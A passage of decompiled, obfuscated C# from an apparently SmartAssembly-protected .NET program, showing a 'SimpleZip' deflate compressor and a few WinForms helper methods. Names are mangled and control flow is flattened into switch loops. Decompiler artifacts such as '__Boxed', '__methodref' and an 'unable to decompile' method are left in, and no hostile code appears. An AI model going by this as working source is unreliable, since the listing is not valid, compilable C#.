        int num2;
        int num3;
        int num4;
        int num5;
        try
        {
          try
          {
            num1 = 8;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  goto label_14;
                case 2:
                  this.Ⴄ();
                  num1 = 3;
                  continue;
                case 3:
                  num1 = this.Ⴜ.Ⴓ >= 262 ? 11 : 14;
                  continue;
                case 4:
                case 15:
                  AppPathFinder.Ⴍ((Array) this.Ⴜ.ႰႷ, this.Ⴜ.ႰႨ, (Array) this.Ⴜ.Ⴜ, this.Ⴜ.Ⴃ + this.Ⴜ.Ⴓ, num2, 666, 640);
                  num1 = 17;
                  continue;
                case 5:
                  SimpleZip.ႤႨ ⴄⴈ1 = this;
                  num4 = ⴄⴈ1.Ⴜ.ႰႰ + num2;
                  ⴄⴈ1.Ⴜ.ႰႰ = num4;
                  num1 = 7;
                  continue;
                case 6:
                case 12:
                  num2 = this.Ⴜ.ႰႭ - this.Ⴜ.ႰႨ;
                  num1 = 4;
                  continue;
                case 7:
                  SimpleZip.ႤႨ ⴄⴈ2 = this;
                  num5 = ⴄⴈ2.Ⴜ.Ⴓ + num2;
                  ⴄⴈ2.Ⴜ.Ⴓ = num5;
                  num1 = 3;
                  continue;
                case 9:
                  num2 = 65536 - this.Ⴜ.Ⴓ - this.Ⴜ.Ⴃ;
                  num1 = 13;
                  continue;
                case 10:
                case 16:
                  goto label_17;
                case 11:
                  num1 = this.Ⴜ.Ⴓ < 3 ? 16 : 0;
                  continue;
                case 13:
                  num1 = num2 <= this.Ⴜ.ႰႭ - this.Ⴜ.ႰႨ ? 4 : 6;
                  continue;
                case 14:
                  num1 = this.Ⴜ.ႰႨ < this.Ⴜ.ႰႭ ? 9 : 11;
                  continue;
                case 17:
                  SimpleZip.ႤႨ ⴄⴈ3 = this;
                  num3 = ⴄⴈ3.Ⴜ.ႰႨ + num2;
                  ⴄⴈ3.Ⴜ.ႰႨ = num3;
                  num1 = 5;
                  continue;
                default:
                  num1 = this.Ⴜ.Ⴃ < 65274 ? 3 : 2;
                  continue;
              }
            }
label_14:
            this.Ⴓ();
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num2;
            StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
            throw;
          }
label_17:
          switch (0)
          {
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num5;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) num1;
          int num6;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) num6;
          StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) this);
          throw;
        }
      }

      private bool Ⴅ(int Ⴗ)
      {
        int num1;
        int num2;
        int num3;
        short[] ⴈ;
        int ⴃ;
        int index;
        int num4;
        int num5;
        int num6;
        byte num7;
        byte num8;
        int num9;
        int num10;
        int num11;
        bool flag;
        object[] objArray;
        try
        {
          try
          {
            num1 = 13;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  num9 = Ⴗ + 2;
                  ⴃ += 2;
                  num1 = 27;
                  continue;
                case 1:
                case 30:
                  ⴃ = this.Ⴜ.Ⴃ;
                  num1 = 29;
                  continue;
                case 2:
                  num8 = this.Ⴜ.Ⴜ[index];
                  num1 = 1;
                  continue;
                case 3:
                  num1 = 8;
                  continue;
                case 4:
                  num11 = Ⴈ.Ⴗ.Ⴃ(num4, this.Ⴜ.Ⴓ, 21, 96);
                  this.Ⴜ.Ⴅ = num11;
                  num1 = 14;
                  continue;
                case 5:
                  num4 = Ⴈ.ႳႤ.Ⴈ(this.Ⴜ.Ⴅ, 2, 141, 213);
                  num1 = 28;
                  continue;
                case 6:
                  num1 = ⴃ <= index ? 1 : 31;
                  continue;
                case 8:
                  num6 = this.Ⴜ.Ⴃ + 258 - 1;
                  num7 = this.Ⴜ.Ⴜ[index - 1];
                  num1 = 10;
                  continue;
                case 9:
                  num1 = (int) this.Ⴜ.Ⴜ[++ⴃ] != (int) this.Ⴜ.Ⴜ[++num9] ? 6 : 34;
                  continue;
                case 10:
                  num8 = this.Ⴜ.Ⴜ[index];
                  num1 = num4 < 8 ? 15 : 16;
                  continue;
                case 11:
                  num1 = (int) this.Ⴜ.Ⴜ[++ⴃ] != (int) this.Ⴜ.Ⴜ[++num9] ? 6 : 24;
                  continue;
                case 12:
                  num1 = (int) this.Ⴜ.Ⴜ[++ⴃ] != (int) this.Ⴜ.Ⴜ[++num9] ? 6 : 9;
                  continue;
                case 14:
                  goto label_35;
                case 15:
                  num1 = num3 <= this.Ⴜ.Ⴓ ? 33 : 17;
                  continue;
                case 16:
                  num2 >>= 2;
                  num1 = 15;
                  continue;
                case 17:
                  num3 = this.Ⴜ.Ⴓ;
                  num1 = 33;
                  continue;
                case 18:
                  num1 = (int) this.Ⴜ.Ⴜ[Ⴗ] != (int) this.Ⴜ.Ⴜ[ⴃ] ? 29 : 35;
                  continue;
                case 19:
                  num1 = (int) this.Ⴜ.Ⴜ[++ⴃ] != (int) this.Ⴜ.Ⴜ[++num9] ? 6 : 32;
                  continue;
                case 20:
                  num1 = num4 >= num3 ? 4 : 25;
                  continue;
                case 21:
                  num1 = (int) this.Ⴜ.Ⴜ[Ⴗ + num4 - 1] != (int) num7 ? 29 : 18;
                  continue;
                case 22:
                  index = this.Ⴜ.Ⴃ + this.Ⴜ.Ⴅ;
                  num1 = 5;
                  continue;
                case 23:
                  num1 = --num2 != 0 ? 33 : 4;
                  continue;
                case 24:
                  num1 = ⴃ < num6 ? 27 : 6;
                  continue;
                case 25:
                  num7 = this.Ⴜ.Ⴜ[index - 1];
                  goto case 2;
                case 26:
                  num1 = (int) this.Ⴜ.Ⴜ[++ⴃ] != (int) this.Ⴜ.Ⴜ[++num9] ? 6 : 19;
                  continue;
                case 27:
                  num1 = (int) this.Ⴜ.Ⴜ[++ⴃ] != (int) this.Ⴜ.Ⴜ[++num9] ? 6 : 12;
                  continue;
                case 28:
                  num5 = Ⴈ.ႳႤ.Ⴈ(this.Ⴜ.Ⴃ - 32506, 0, 659, 715);
                  goto case 3;
                case 29:
                  num1 = (Ⴗ = (int) ⴈ[Ⴗ & (int) short.MaxValue] & (int) ushort.MaxValue) <= num5 ? 4 : 23;
                  continue;
                case 31:
                  num10 = Ⴗ;
                  this.Ⴜ.Ⴍ = num10;
                  index = ⴃ;
                  num4 = ⴃ - this.Ⴜ.Ⴃ;
                  num1 = 20;
                  continue;
                case 32:
                  num1 = (int) this.Ⴜ.Ⴜ[++ⴃ] != (int) this.Ⴜ.Ⴜ[++num9] ? 6 : 11;
                  continue;
                case 33:
                  num1 = (int) this.Ⴜ.Ⴜ[Ⴗ + num4] != (int) num8 ? 29 : 21;
                  continue;
                case 34:
                  num1 = (int) this.Ⴜ.Ⴜ[++ⴃ] != (int) this.Ⴜ.Ⴜ[++num9] ? 6 : 26;
                  continue;
                case 35:
                  num1 = (int) this.Ⴜ.Ⴜ[Ⴗ + 1] != (int) this.Ⴜ.Ⴜ[ⴃ + 1] ? 29 : 0;
                  continue;
                default:
                  num2 = 128;
                  num3 = 128;
                  ⴈ = this.Ⴜ.Ⴈ;
                  ⴃ = this.Ⴜ.Ⴃ;
                  num1 = 22;
                  continue;
              }
            }
label_35:
            flag = this.Ⴜ.Ⴅ >= 3;
          }
          catch (Exception ex)
          {
            objArray = new object[13]
            {
              (object) num2,
              (object) num3,
              (object) ⴈ,
              (object) ⴃ,
              (object) num9,
              (object) index,
              (object) num4,
              (object) num5,
              (object) num6,
              (object) num7,
              (object) num8,
              (object) this,
              (object) Ⴗ
            };
            object[] objects = objArray;
            StackFrameHelper.CreateExceptionN(ex, objects);
            throw;
          }
          switch (2)
          {
            default:
              return flag;
          }
        }
        catch (Exception ex)
        {
          int num12;
          object[] objects = new object[19]
          {
            (object) num2,
            (object) num3,
            (object) ⴈ,
            (object) ⴃ,
            (object) num9,
            (object) index,
            (object) num4,
            (object) num5,
            (object) num6,
            (object) num7,
            (object) num8,
            (object) objArray,
            (object) flag,
            (object) num10,
            (object) num11,
            (object) num1,
            (object) num12,
            (object) this,
            (object) Ⴗ
          };
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
      }

      private bool Ⴗ(bool Ⴗ, bool Ⴓ)
      {
        int num1;
        bool flag1;
        bool flag2;
        int ⴃ;
        int ⴍ;
        int ⴅ;
        int Ⴗ1;
        int num2;
        int num3;
        int num4;
        int num5;
        int num6;
        bool flag3;
        int num7;
        bool flag4;
        int num8;
        int num9;
        int Ⴗ2;
        bool Ⴀ;
        int num10;
        try
        {
          try
          {
            num1 = 47;
            while (true)
            {
              int num11;
              switch (num1)
              {
                case 0:
                  goto label_4;
                case 1:
                  num1 = this.Ⴜ.Ⴅ > ⴅ ? 50 : 27;
                  continue;
                case 2:
                  goto label_52;
                case 3:
                  Ⴗ2 = this.Ⴜ.Ⴃ - this.Ⴜ.Ⴀ;
                  num1 = 9;
                  continue;
                case 4:
                  num9 = --this.Ⴜ.Ⴓ;
                  num1 = 51;
                  continue;
                case 5:
                  num1 = this.Ⴜ.Ⴓ < 3 ? 31 : 44;
                  continue;
                case 6:
                  flag4 = true;
                  this.Ⴜ.Ⴄ = flag4;
                  num8 = ++this.Ⴜ.Ⴃ;
                  num1 = 4;
                  continue;
                case 7:
                  num1 = !this.Ⴜ.Ⴄ ? 8 : 36;
                  continue;
                case 8:
                  flag2 = false;
                  this.Ⴜ.Ⴄ = flag2;
                  this.Ⴗ.Ⴃ(this.Ⴜ.Ⴜ, this.Ⴜ.Ⴀ, this.Ⴜ.Ⴃ - this.Ⴜ.Ⴀ, Ⴓ);
                  num1 = 23;
                  continue;
                case 9:
                  num1 = !this.Ⴜ.Ⴄ ? 11 : 21;
                  continue;
                case 10:
                  num1 = 29;
                  continue;
                case 11:
                  num1 = !Ⴓ ? 32 : 18;
                  continue;
                case 12:
                  num1 = this.Ⴜ.Ⴃ < 65274 ? 35 : 39;
                  continue;
                case 13:
                  num1 = Ⴗ ? 28 : 0;
                  continue;
                case 14:
                  num1 = this.Ⴜ.Ⴃ - this.Ⴜ.Ⴍ <= 4096 ? 31 : 49;
                  continue;
                case 15:
                  SimpleZip.ႤႨ ⴄⴈ = this;
                  num10 = ⴄⴈ.Ⴜ.Ⴀ + Ⴗ2;
                  ⴄⴈ.Ⴜ.Ⴀ = num10;
                  num1 = 22;
                  continue;
                case 16:
                  num11 = !this.Ⴜ.Ⴄ ? 1 : 0;
                  break;
                case 17:
                  this.Ⴗ.Ⴐ((int) this.Ⴜ.Ⴜ[this.Ⴜ.Ⴃ - 1] & (int) byte.MaxValue);
                  num1 = 6;
                  continue;
                case 18:
                  num1 = this.Ⴜ.Ⴓ != 0 ? 32 : 16;
                  continue;
                case 19:
                  num6 = --this.Ⴜ.Ⴓ;
                  num1 = 25;
                  continue;
                case 20:
                  ⴅ -= 2;
                  num1 = 24;
                  continue;
                case 21:
                  --Ⴗ2;
                  num1 = 11;
                  continue;
                case 22:
                  goto label_49;
                case 23:
                case 30:
                  ⴃ = this.Ⴜ.Ⴃ;
                  this.Ⴜ.Ⴀ = ⴃ;
                  num1 = 42;
                  continue;
                case 24:
                  num3 = ++this.Ⴜ.Ⴃ;
                  num1 = 43;
                  continue;
                case 25:
                  flag3 = false;
                  this.Ⴜ.Ⴄ = flag3;
                  num7 = 2;
                  this.Ⴜ.Ⴅ = num7;
                  num1 = 51;
                  continue;
                case 26:
                case 45:
                  num1 = this.Ⴜ.Ⴅ != 3 ? 31 : 14;
                  continue;
                case 27:
                  this.Ⴗ.Ⴃ(this.Ⴜ.Ⴃ - 1 - ⴍ, ⴅ);
                  num1 = 20;
                  continue;
                case 28:
                  num1 = this.Ⴜ.Ⴓ >= 262 ? 38 : 33;
                  continue;
                case 29:
                  num1 = this.Ⴜ.Ⴓ < 3 ? 41 : 52;
                  continue;
                case 31:
                  num1 = ⴅ < 3 ? 50 : 1;
                  continue;
                case 32:
                  num11 = 0;
                  break;
                case 33:
                  num1 = Ⴗ ? 38 : 2;
                  continue;
                case 34:
                  num5 = ++this.Ⴜ.Ⴃ;
                  num1 = 19;
                  continue;
                case 35:
                  ⴍ = this.Ⴜ.Ⴍ;
                  ⴅ = this.Ⴜ.Ⴅ;
                  num1 = 5;
                  continue;
                case 36:
                  this.Ⴗ.Ⴐ((int) this.Ⴜ.Ⴜ[this.Ⴜ.Ⴃ - 1] & (int) byte.MaxValue);
                  num1 = 8;
                  continue;
                case 37:
                  num1 = !this.Ⴅ(Ⴗ1) ? 31 : 46;
                  continue;
                case 38:
                  num1 = this.Ⴜ.Ⴓ != 0 ? 12 : 7;
                  continue;
                case 39:
                  this.Ⴄ();
                  goto case 35;
                case 40:
                  num1 = this.Ⴜ.Ⴃ - Ⴗ1 > 32506 ? 31 : 37;
                  continue;
                case 41:
                  num1 = --ⴅ > 0 ? 24 : 34;
                  continue;
                case 42:
                  goto label_10;
                case 43:
                  num4 = --this.Ⴜ.Ⴓ;
                  goto case 10;
                case 44:
                  Ⴗ1 = this.Ⴃ();
                  num1 = Ⴗ1 == 0 ? 31 : 40;
                  continue;
                case 46:
                  num1 = this.Ⴜ.Ⴅ > 5 ? 31 : 26;
                  continue;
                case 49:
                  num2 = 2;
                  this.Ⴜ.Ⴅ = num2;
                  num1 = 31;
                  continue;
                case 50:
                  num1 = !this.Ⴜ.Ⴄ ? 6 : 17;
                  continue;
                case 51:
                  num1 = !this.Ⴗ.Ⴍ() ? 28 : 3;
                  continue;
                case 52:
                  this.Ⴃ();
                  num1 = 41;
                  continue;
                default:
                  num1 = this.Ⴜ.Ⴓ >= 262 ? 28 : 13;
                  continue;
              }
              Ⴀ = num11 != 0;
              this.Ⴗ.Ⴃ(this.Ⴜ.Ⴜ, this.Ⴜ.Ⴀ, Ⴗ2, Ⴀ);
              num1 = 15;
            }
label_4:
            flag1 = false;
            goto label_54;
label_10:
            flag1 = false;
            goto label_54;
label_49:
            flag1 = !Ⴀ;
            goto label_54;
label_52:
            flag1 = true;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) ⴍ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) ⴅ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) Ⴗ1;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) Ⴗ2;
            // ISSUE: variable of a boxed type
            __Boxed<bool> o5 = (ValueType) Ⴀ;
            // ISSUE: variable of a boxed type
            __Boxed<bool> o7 = (ValueType) Ⴗ;
            // ISSUE: variable of a boxed type
            __Boxed<bool> o8 = (ValueType) Ⴓ;
            StackFrameHelper.CreateException8(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) this, (object) o7, (object) o8);
            throw;
          }
label_54:
          switch (2)
          {
            default:
              return flag1;
          }
        }
        catch (Exception ex)
        {
          int num12;
          object[] objects = new object[24]
          {
            (object) ⴍ,
            (object) ⴅ,
            (object) Ⴗ1,
            (object) Ⴗ2,
            (object) Ⴀ,
            (object) flag1,
            (object) flag2,
            (object) ⴃ,
            (object) num2,
            (object) num3,
            (object) num4,
            (object) num5,
            (object) num6,
            (object) flag3,
            (object) num7,
            (object) flag4,
            (object) num8,
            (object) num9,
            (object) num10,
            (object) num1,
            (object) num12,
            (object) this,
            (object) Ⴗ,
            (object) Ⴓ
          };
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
      }

      public bool Ⴄ(bool Ⴐ, bool Ⴅ)
      {
        // ISSUE: unable to decompile the method.
      }

      public void Ⴈ(byte[] Ⴅ)
      {
        int num1;
        byte[] numArray;
        int num2;
        int length;
        try
        {
          try
          {
            num1 = 1;
            while (true)
            {
              switch (num1)
              {
                case 0:
                case 3:
                  num2 = 0;
                  this.Ⴜ.ႰႨ = num2;
                  goto case 2;
                case 2:
                  num1 = 4;
                  continue;
                case 4:
                  goto label_5;
                default:
                  numArray = Ⴅ;
                  this.Ⴜ.ႰႷ = numArray;
                  goto case 0;
              }
            }
label_5:
            length = Ⴅ.Length;
            this.Ⴜ.ႰႭ = length;
          }
          catch (Exception ex)
          {
            byte[] o2 = Ⴅ;
            StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
            throw;
          }
          switch (2)
          {
          }
        }
        catch (Exception ex)
        {
          byte[] o1 = numArray;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) length;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num1;
          int num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) num3;
          byte[] o7 = Ⴅ;
          StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) this, (object) o7);
          throw;
        }
      }

      public bool Ⴀ()
      {
        try
        {
          bool flag;
          try
          {
            flag = this.Ⴜ.ႰႭ == this.Ⴜ.ႰႨ;
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
          return flag;
        }
        catch (Exception ex)
        {
          bool flag;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o1 = (ValueType) flag;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }

      static ႤႨ()
      {
        try
        {
          SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException0(ex);
          throw;
        }
      }

      internal static int Ⴍ([In] Control obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        try
        {
label_3:
          int num2;
          switch (obj2 ^ obj1)
          {
            case 85:
              num2 = 5;
              break;
            case 86:
              num2 = 4;
              break;
            default:
              num2 = 6;
              break;
          }
          num1 = num2;
          while (true)
          {
            switch (num1)
            {
              case 0:
              case 3:
                goto label_3;
              case 1:
              case 5:
                goto label_9;
              case 2:
              case 7:
                num1 = 3;
                continue;
              case 4:
                goto label_10;
              case 6:
                num1 = 3;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႤႨ.Ⴍ);
                num1 = 3;
                continue;
            }
          }
label_9:
          return obj0.Height;
label_10:
          return obj0.Top;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          Control o2 = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) obj2;
          StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
          throw;
        }
      }

      internal static void Ⴐ([In] ButtonBase obj0, [In] Image obj1, [In] int obj2, [In] int obj3)
      {
        int num1;
        try
        {
          num1 = 1;
          while (true)
          {
            switch (num1)
            {
              case 0:
              case 3:
              case 4:
                goto label_7;
              case 2:
                num1 = 1;
                continue;
              default:
                int num2;
                switch (obj3 ^ obj2)
                {
                  case 16:
                    num2 = 0;
                    break;
                  default:
                    num2 = 2;
                    break;
                }
                num1 = num2;
                continue;
            }
          }
label_7:
          obj0.Image = obj1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          int num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num3;
          ButtonBase o3 = obj0;
          Image o4 = obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) obj2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) obj3;
          StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
          throw;
        }
      }

      internal static void ႤႣ([In] ButtonBase obj0, [In] FlatStyle obj1, [In] int obj2, [In] int obj3)
      {
        int num1;
        try
        {
          num1 = 2;
          while (true)
          {
            switch (num1)
            {
              case 0:
                goto label_8;
              case 1:
              case 3:
              case 5:
                num1 = 2;
                continue;
              case 4:
                goto label_7;
              default:
                int num2;
                switch (obj3 ^ obj2)
                {
                  case 35:
                    num2 = 4;
                    break;
                  default:
                    num2 = 3;
                    break;
                }
                num1 = num2;
                continue;
            }
          }
label_8:
          return;
label_7:
          obj0.FlatStyle = obj1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          int num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num3;
          ButtonBase o3 = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<FlatStyle> o4 = (Enum) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) obj2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) obj3;
          StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
          throw;
        }
      }

      internal static void ႤႤ([In] int obj0, [In] int obj1)
      {
        int num1;
        try
        {
          num1 = 4;
          while (true)
          {
            switch (num1)
            {
              case 1:
              case 2:
                goto label_7;
              case 3:
              case 5:
                num1 = 4;
                continue;
              default:
                int num2;
                switch (obj1 ^ obj0)
                {
                  case 7:
                    num2 = 2;
                    break;
                  default:
                    num2 = 5;
                    break;
                }
                num1 = num2;
                continue;
            }
          }
label_7:
          Application.Exit();
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          int num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) obj1;
          StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
          throw;
        }
      }
    }

    internal sealed class ႤႼ
    {
      protected byte[] Ⴃ;
      private Ⴈ.ႷႳ.Ⴐ Ⴀ;

      public void Ⴈ(int Ⴅ)
      {
        int num1;
        int ⴄ;
        int num2;
        int num3;
        try
        {
          try
          {
            num1 = 5;
            while (true)
            {
              switch (num1)
              {
                case 1:
                  num1 = 4;
                  continue;
                case 4:
                  goto label_4;
                default:
                  byte[] ⴃ1 = this.Ⴃ;
                  SimpleZip.ႤႼ ⴄⴜ1 = this;
                  num2 = (ⴄ = ⴄⴜ1.Ⴀ.Ⴄ) + 1;
                  ⴄⴜ1.Ⴀ.Ⴄ = num2;
                  int index1 = ⴄ;
                  int num4 = (int) (byte) Ⴅ;
                  ⴃ1[index1] = (byte) num4;
                  goto case 1;
              }
            }
label_4:
            byte[] ⴃ2 = this.Ⴃ;
            SimpleZip.ႤႼ ⴄⴜ2 = this;
            num3 = (ⴄ = ⴄⴜ2.Ⴀ.Ⴄ) + 1;
            ⴄⴜ2.Ⴀ.Ⴄ = num3;
            int index2 = ⴄ;
            int num5 = (int) (byte) (Ⴅ >> 8);
            ⴃ2[index2] = (byte) num5;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) ⴄ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) Ⴅ;
            StackFrameHelper.CreateException3(ex, (object) o1, (object) this, (object) o3);
            throw;
          }
          switch (1)
          {
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) ⴄ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num1;
          int num6;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) num6;
          // ISSUE: variable of a boxed type
          __Boxed<int> o7 = (ValueType) Ⴅ;
          StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) this, (object) o7);
          throw;
        }
      }

      public void Ⴗ(byte[] Ⴅ, int Ⴀ, int Ⴗ)
      {
        int num1;
        int num2;
        try
        {
          try
          {
            num1 = 3;
            while (true)
            {
              switch (num1)
              {
                case 2:
                case 4:
                  goto label_6;
                case 5:
                  goto label_3;
                default:
                  AppPathFinder.Ⴍ((Array) Ⴅ, Ⴀ, (Array) this.Ⴃ, this.Ⴀ.Ⴄ, Ⴗ, 408, 386);
                  num1 = 5;
                  continue;
              }
            }
label_3:
            SimpleZip.ႤႼ ⴄⴜ = this;
            num2 = ⴄⴜ.Ⴀ.Ⴄ + Ⴗ;
            ⴄⴜ.Ⴀ.Ⴄ = num2;
          }
          catch (Exception ex)
          {
            byte[] o2 = Ⴅ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) Ⴀ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) Ⴗ;
            StackFrameHelper.CreateException4(ex, (object) this, (object) o2, (object) o3, (object) o4);
            throw;
          }
label_6:
          switch (3)
          {
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num1;
          int num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num3;
          byte[] o5 = Ⴅ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) Ⴀ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o7 = (ValueType) Ⴗ;
          StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) o3, (object) this, (object) o5, (object) o6, (object) o7);
          throw;
        }
      }

      [SpecialName]
      public int Ⴓ()
      {
        try
        {
          int ⴈ;
          try
          {
            ⴈ = this.Ⴀ.Ⴈ;
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
          return ⴈ;
        }
        catch (Exception ex)
        {
          int num;
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }

      public void Ⴃ()
      {
        int num1;
        int ⴄ;
        int num2;
        int num3;
        uint num4;
        int num5;
        try
        {
          try
          {
            num1 = 0;
            while (true)
            {
              switch (num1)
              {
                case 1:
                  byte[] ⴃ1 = this.Ⴃ;
                  SimpleZip.ႤႼ ⴄⴜ1 = this;
                  num3 = (ⴄ = ⴄⴜ1.Ⴀ.Ⴄ) + 1;
                  ⴄⴜ1.Ⴀ.Ⴄ = num3;
                  int index1 = ⴄ;
                  int num6 = (int) (byte) (this.Ⴀ.Ⴍ >> 8);
                  ⴃ1[index1] = (byte) num6;
                  num1 = 7;
                  continue;
                case 2:
                case 4:
                  num1 = this.Ⴀ.Ⴈ <= 8 ? 7 : 1;
                  continue;
                case 3:
                  num1 = 4;
                  continue;
                case 5:
                  byte[] ⴃ2 = this.Ⴃ;
                  SimpleZip.ႤႼ ⴄⴜ2 = this;
                  num2 = (ⴄ = ⴄⴜ2.Ⴀ.Ⴄ) + 1;
                  ⴄⴜ2.Ⴀ.Ⴄ = num2;
                  int index2 = ⴄ;
                  int ⴍ = (int) (byte) this.Ⴀ.Ⴍ;
                  ⴃ2[index2] = (byte) ⴍ;
                  goto case 3;
                case 6:
                case 7:
                  goto label_7;
                default:
                  num1 = this.Ⴀ.Ⴈ <= 0 ? 7 : 5;
                  continue;
              }
            }
label_7:
            num4 = 0U;
            this.Ⴀ.Ⴍ = num4;
            num5 = 0;
            this.Ⴀ.Ⴈ = num5;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) ⴄ;
            StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
            throw;
          }
          switch (2)
          {
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) ⴄ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<uint> o4 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) num5;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) num1;
          int num7;
          // ISSUE: variable of a boxed type
          __Boxed<int> o7 = (ValueType) num7;
          StackFrameHelper.CreateException8(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) this);
          throw;
        }
      }

      public void Ⴅ(int Ⴃ, int Ⴄ)
      {
        int num1;
        uint num2;
        int num3;
        int ⴄ;
        int num4;
        int num5;
        uint num6;
        int num7;
        try
        {
          try
          {
            num1 = 0;
            while (true)
            {
              switch (num1)
              {
                case 1:
                case 11:
                  num1 = this.Ⴀ.Ⴈ < 16 ? 7 : 5;
                  continue;
                case 2:
                  SimpleZip.ႤႼ ⴄⴜ1 = this;
                  num3 = ⴄⴜ1.Ⴀ.Ⴈ + Ⴄ;
                  ⴄⴜ1.Ⴀ.Ⴈ = num3;
                  num1 = 11;
                  continue;
                case 3:
                  byte[] ⴃ1 = this.Ⴃ;
                  SimpleZip.ႤႼ ⴄⴜ2 = this;
                  num5 = (ⴄ = ⴄⴜ2.Ⴀ.Ⴄ) + 1;
                  ⴄⴜ2.Ⴀ.Ⴄ = num5;
